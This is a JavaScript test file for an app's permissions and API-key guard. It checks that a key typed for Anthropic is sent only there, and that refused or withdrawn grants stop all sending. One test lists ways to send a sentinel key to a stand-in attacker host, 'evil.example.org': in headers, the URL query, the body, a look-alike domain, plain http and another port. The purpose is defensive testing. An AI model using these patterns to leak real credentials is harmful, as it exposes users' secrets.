// Hermes, place names in a text: asking permission to send the text to a language-model service
// (src/engine/hermes/text/ask.js), with the REAL permissions module and key keeper, and a FAKE fetch
// beneath them that records every request. No key here is real; each is a sentinel made for the run, looked
// for everywhere it must not be. Nothing reaches a network: the global fetch fails the test.
//
// The two promises, each with the send that proves the test can see one: a key can never reach a host it
// was not typed for, and a grant that is refused, never given or forgotten sends nothing.
import { test, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import * as T from '../src/engine/hermes/text/index.js';
import * as core from '../src/lib/permissions-core.js';
import * as permissions from '../src/lib/permissions.js';

globalThis.fetch = () => { throw new Error('network guard: a test tried to reach the network'); };

const KEY = `sk-ant-test-NEVER-REAL-${Math.random().toString(36).slice(2)}${Date.now().toString(36)}`;
const OTHER_KEY = `sk-test-OTHER-NEVER-REAL-${Math.random().toString(36).slice(2)}`;
const ANTHROPIC = 'https://api.anthropic.com';
const LOCAL = 'http://localhost:11434';
const NOW = new Date('2026-10-20T12:00:00Z');
const TEXT = 'We sailed from Gades to Ostia, and from Ostia to Rome. '.repeat(40);
const SOURCE = { title: 'A test itinerary' };
const MODEL = 'claude-sonnet-5-5';

class Store {
  constructor() { this.m = new Map(); }
  getItem(k) { return this.m.has(k) ? this.m.get(k) : null; }
  setItem(k, v) { this.m.set(k, String(v)); }
  removeItem(k) { this.m.delete(k); }
}
let calls;
const reply = (url) => new Response(url.endsWith('/v1/messages')
  ? JSON.stringify({ id: 'm', model: MODEL, stop_reason: 'end_turn', content: [{ type: 'text', text: '{"mentions":[]}' }], usage: { input_tokens: 800, output_tokens: 60 } })
  : JSON.stringify({ id: 'c', model: 'qwen3:0.6b', choices: [{ finish_reason: 'stop', message: { content: '{"mentions":[]}' } }], usage: { prompt_tokens: 700, completion_tokens: 9 } }), { status: 200, headers: { 'content-type': 'application/json' } });
beforeEach(() => {
  globalThis.localStorage = new Store();
  globalThis.sessionStorage = new Store();
  calls = [];
  permissions.resetForTests();
  permissions.llmKeys.forgetAll();
  permissions.configure({ fetch: async (url, init) => { calls.push({ url, init }); return reply(url); }, enforced: async () => true });
  inPolicy();
});
function inPolicy(...origins) { globalThis.__platoCsp = { policy: core.policyFor(origins), origins }; }
const chunks = () => T.chunkText(TEXT, { target: 1000, overlap: 100 });
const plan = (o = {}) => T.planSend({ service: 'anthropic', permissions, model: MODEL, chunks: chunks(), now: NOW, ...o });
const allowAnthropic = () => { inPolicy(ANTHROPIC); permissions.set('llm', 'anthropic', 'allowed'); };
const everywhere = () => JSON.stringify([...calls.map((c) => ({ ...c.init, signal: undefined })), globalThis.localStorage.m, globalThis.sessionStorage.m]);

// ---- guardKey: the last line, beneath the permissions module --------------------------------------
test('a request that carries the key to a site it was not typed for is not made, wherever the key is put in it', async () => {
  const sent = [];
  const guarded = T.guardKey(async (url, init) => { sent.push(url); return new Response('{}'); }, KEY, [ANTHROPIC]);
  await guarded(`${ANTHROPIC}/v1/messages`, { headers: { 'x-api-key': KEY } });
  assert.equal(sent.length, 1, 'control: to its own site, it goes');
  const evil = 'https://evil.example.org/v1/messages';
  for (const [how, url, init] of [
    ['a header', evil, { headers: { 'x-api-key': KEY } }],
    ['a bearer header', evil, { headers: { Authorization: `Bearer ${KEY}` } }],
    ['a Headers object', evil, { headers: new Headers({ 'x-api-key': KEY }) }],
    ['a list of headers', evil, { headers: [['x-api-key', KEY]] }],
    ['the address', `${evil}?key=${KEY}`, {}],
    ['the body', evil, { method: 'POST', body: JSON.stringify({ note: KEY }) }],
    ['a look-alike site', 'https://api.anthropic.com.evil.example.org/v1/messages', { headers: { 'x-api-key': KEY } }],
    ['plain http', 'http://api.anthropic.com/v1/messages', { headers: { 'x-api-key': KEY } }],
    ['another port', 'https://api.anthropic.com:8443/v1/messages', { headers: { 'x-api-key': KEY } }],
  ]) {
    await assert.rejects(guarded(url, init), { name: 'KeyError', kind: 'misdirected' }, how);
  }
  assert.equal(sent.length, 1, 'none of them was made');
  await guarded(evil, { headers: { accept: 'application/json' } });
  assert.equal(sent.length, 2, 'a request to another site that does not carry the key is not this guard\'s business');
});

test('the guard sits in the plan: a key handed out wrongly is still not sent to a site it was not typed for', async () => {
  // A keeper that gives the key for any address, though it says it was typed for Anthropic's site.
  const sent = [];
  const broken = { state: () => 'allowed', waitsForReload: () => false, allowed: () => true, fetch: async (url, init) => { sent.push(url); return reply(url); },
    llmKeys: { has: () => true, keyFor: () => KEY, boundTo: () => [ANTHROPIC] } };
  const noSleep = async () => {};
  const mis = T.planSend({ service: LOCAL, permissions: broken, model: 'qwen3:0.6b', chunks: chunks(), now: NOW, adapter: { sleep: noSleep } }).confirm();
  await assert.rejects(mis.extract(chunks()[0], { model: 'qwen3:0.6b' }), { name: 'KeyError', kind: 'misdirected' });
  assert.deepEqual(sent, [], 'nothing was sent');
  // The same keeper, asked about the site it was typed for, sends (the control: the guard is not simply refusing).
  const right = T.planSend({ service: 'anthropic', permissions: broken, model: MODEL, chunks: chunks(), now: NOW }).confirm();
  await right.extract(chunks()[0], { model: MODEL });
  assert.deepEqual(sent, [`${ANTHROPIC}/v1/messages`]);
});

// ---- the key, the plan and the sites --------------------------------------------------------------
test('a key typed for Anthropic never reaches another service, whichever service is asked', async () => {
  permissions.llmKeys.set('anthropic', KEY);
  permissions.llmKeys.set(LOCAL, OTHER_KEY);
  allowAnthropic(); inPolicy(ANTHROPIC, LOCAL); permissions.set('llm', LOCAL, 'allowed');
  const a = plan().confirm();
  await a.extract(chunks()[0], { model: MODEL });
  assert.equal(calls.length, 1);
  assert.equal(calls[0].url, `${ANTHROPIC}/v1/messages`);
  assert.equal(calls[0].init.headers['x-api-key'], KEY, 'presence: the key went to Anthropic, in its header');
  // The local server is given its own key and never Anthropic's; Anthropic never the local server's.
  const l = T.planSend({ service: LOCAL, permissions, model: 'qwen3:0.6b', chunks: chunks(), now: NOW }).confirm();
  await l.extract(chunks()[0], { model: 'qwen3:0.6b' });
  assert.equal(calls[1].url, `${LOCAL}/v1/chat/completions`);
  assert.equal(calls[1].init.headers.Authorization, `Bearer ${OTHER_KEY}`);
  for (const c of calls) {
    const whole = JSON.stringify([c.url, c.init.headers, c.init.body]);
    assert.equal(whole.includes(KEY), c.url.startsWith(ANTHROPIC), `Anthropic's key is in the request to Anthropic and in no other: ${c.url}`);
    assert.equal(whole.includes(OTHER_KEY), c.url.startsWith(LOCAL), `the local server's key is in the request to it and in no other: ${c.url}`);
  }
  // A site given no key gets none: Anthropic's key is not tried there.
  permissions.set('llm', 'https://llm.example.org', 'allowed'); inPolicy(ANTHROPIC, LOCAL, 'https://llm.example.org');
  const x = T.planSend({ service: 'https://llm.example.org', permissions, model: 'm', chunks: chunks(), now: NOW });
  assert.equal(x.assessment.blocked, 'no-price', 'a service elsewhere without a price is not sent to');
  assert.throws(() => x.confirm(), { name: 'ConsentError', kind: 'no-price' });
  // Anthropic's address given as a site is another permission, with no key held: nothing is found for it.
  assert.equal(permissions.llmKeys.keyFor(ANTHROPIC, `${ANTHROPIC}/v1/messages`), null);
  assert.equal(calls.length, 2);
});

test('with no key held for Anthropic nothing is sent and the words say what is missing; a service of one\'s own needs none', async () => {
  allowAnthropic();
  const p = plan();
  assert.deepEqual([p.ready.ok, p.ready.why], [false, 'no-key']);
  assert.match(p.ready.words, /No key is held for Anthropic/);
  assert.throws(() => p.confirm(), { name: 'ConsentError', kind: 'no-key' });
  assert.equal(calls.length, 0);
  permissions.llmKeys.set('anthropic', KEY);
  assert.equal(plan().ready.ok, true, 'control: with a key, it is ready');
  // Ollama on this computer asks for no key.
  inPolicy(LOCAL); permissions.set('llm', LOCAL, 'allowed');
  const l = T.planSend({ service: LOCAL, permissions, model: 'qwen3:0.6b', chunks: chunks(), now: NOW });
  assert.equal(l.ready.ok, true);
  await l.confirm().extract(chunks()[0], { model: 'qwen3:0.6b' });
  assert.equal(calls.length, 1);
  assert.equal(calls[0].init.headers.Authorization, undefined);
});

test('a grant that is undecided, Never or not yet in force sends nothing; allowed, the same plan goes', async () => {
  permissions.llmKeys.set('anthropic', KEY);
  assert.deepEqual([plan().ready.ok, plan().ready.why], [false, 'undecided']);
  assert.match(plan().ready.words, /has not been allowed/);
  assert.throws(() => plan().confirm(), { name: 'ConsentError', kind: 'undecided' });
  permissions.set('llm', 'anthropic', 'allowed');   // allowed after the page loaded: not in its policy yet
  assert.equal(plan().ready.why, 'reload');
  assert.throws(() => plan().confirm(), { kind: 'reload' });
  permissions.set('llm', 'anthropic', 'never');
  permissions.llmKeys.set('anthropic', KEY);
  assert.equal(plan().ready.why, 'never');
  assert.throws(() => plan().confirm(), { kind: 'never' });
  assert.equal(calls.length, 0, 'nothing was sent');
  allowAnthropic();
  await plan().confirm().extract(chunks()[0], { model: MODEL });
  assert.equal(calls.length, 1, 'control: allowed, it goes');
});

test('a grant forgotten in the middle of a run sends nothing more, and takes the key with it', async () => {
  permissions.llmKeys.set('anthropic', KEY);
  allowAnthropic();
  const text = TEXT;
  const work = T.newWork({ text, source: SOURCE, chunking: { target: 1000, overlap: 100 }, now: NOW.toISOString() });
  const provider = plan().confirm();
  let n = 0;
  const r = await T.runExtraction({ work, text, provider, model: MODEL, onProgress: () => { if (++n === 2) permissions.forget('llm', 'anthropic'); } });
  assert.equal(r.done, 2, 'two parts were done before it was forgotten');
  assert.ok(r.stopped && r.stopped.name === 'ConsentError' && r.stopped.kind === 'withdrawn', String(r.stopped));
  assert.equal(calls.length, 2, 'and no third request was made');
  assert.equal(work.results.length, 2, 'what was done is kept');
  assert.equal(permissions.llmKeys.has('anthropic'), false);
  // Allowed and the key typed again: the work goes on from where it stopped.
  allowAnthropic(); permissions.llmKeys.set('anthropic', KEY);
  const more = await T.runExtraction({ work, text, provider: plan().confirm(), model: MODEL });
  assert.equal(more.skipped, 2);
  assert.equal(more.stopped, null);
  assert.equal(work.results.length, chunks().length);
});

test('a key forgotten from the panel sends nothing more either; a key forgotten is not a permission lost', async () => {
  permissions.llmKeys.set('anthropic', KEY);
  allowAnthropic();
  const provider = plan().confirm();
  await provider.extract(chunks()[0], { model: MODEL });
  permissions.llmKeys.forget('anthropic');
  await assert.rejects(provider.extract(chunks()[1], { model: MODEL }), { name: 'ConsentError', kind: 'withdrawn' });
  assert.equal(calls.length, 1);
  assert.equal(permissions.state('llm', 'anthropic'), 'allowed');
});

test('the plan is built from the permission alone: it shows the estimate and the ceiling before there is a key, and holds no key', () => {
  const p = plan({ ceilingUsd: 3 });
  assert.equal(p.assessment.ceilingUsd, 3);
  assert.equal(p.estimate.chunks, chunks().length);
  assert.match(p.words.join('\n'), /Send this text \(\d[\d,]* characters, \d+ parts\) to Anthropic \(api\.anthropic\.com\)\?/);
  assert.match(p.words.join('\n'), /most this run may cost is \$3\.00/);
  assert.match(p.words.join('\n'), /Anthropic’s terms apply/);
  assert.equal(p.name, 'Anthropic');
  permissions.llmKeys.set('anthropic', KEY);
  assert.ok(!JSON.stringify(plan()).includes(KEY), 'a plan, held and shown by the page, carries no key');
  assert.ok(!JSON.stringify(plan().words).includes(KEY));
  assert.throws(() => plan({ ceilingUsd: 'lots' }), /sum of money/);
  assert.throws(() => T.planSend({ service: 'openai', permissions, model: MODEL, chunks: chunks() }), TypeError);
  assert.throws(() => T.planSend({ service: 'http://llm.example.org', permissions, model: MODEL, chunks: chunks() }), TypeError);
});

test('the ceiling is changeable and shown before sending: a plan over it cannot be confirmed until it is raised', () => {
  permissions.llmKeys.set('anthropic', KEY);
  allowAnthropic();
  const low = plan({ ceilingUsd: 0.01 });
  assert.equal(low.assessment.blocked, 'over-ceiling');
  assert.match(low.words.join('\n'), /over the ceiling of \$0\.01/);
  assert.throws(() => low.confirm(), { name: 'ConsentError', kind: 'over-ceiling' });
  assert.equal(calls.length, 0);
  assert.ok(plan({ ceilingUsd: 5 }).confirm(), 'raised, it can be');
});

test('a whole run through the engine: only Anthropic is asked, the key is in no work file and no error, and the permission is checked before every part', async () => {
  permissions.llmKeys.set('anthropic', KEY);
  allowAnthropic();
  const work = T.newWork({ text: TEXT, source: SOURCE, chunking: { target: 1000, overlap: 100 }, now: NOW.toISOString() });
  const r = await T.runExtraction({ work, text: TEXT, provider: plan().confirm(), model: MODEL });
  assert.equal(r.stopped, null);
  assert.equal(r.done, chunks().length);
  assert.ok(calls.length >= r.done);
  assert.ok(calls.every((c) => new URL(c.url).origin === ANTHROPIC), 'every request went to Anthropic');
  assert.ok(calls.every((c) => c.init.credentials === 'omit' && c.init.redirect === 'manual'), 'with the module\'s own rules');
  assert.ok(!T.serialiseWork(work).includes(KEY), 'absence: the key is not in the work file');
  assert.ok(everywhere().includes(KEY), 'presence: the search finds the key where it was sent (in the request)');
  assert.ok(!JSON.stringify(permissions.list()).includes(KEY) && !JSON.stringify(permissions.remembered()).includes(KEY));
  // The cost counted is the provider's own usage.
  assert.ok(Math.abs(r.usage.input - 800 * chunks().length) < 1);
});
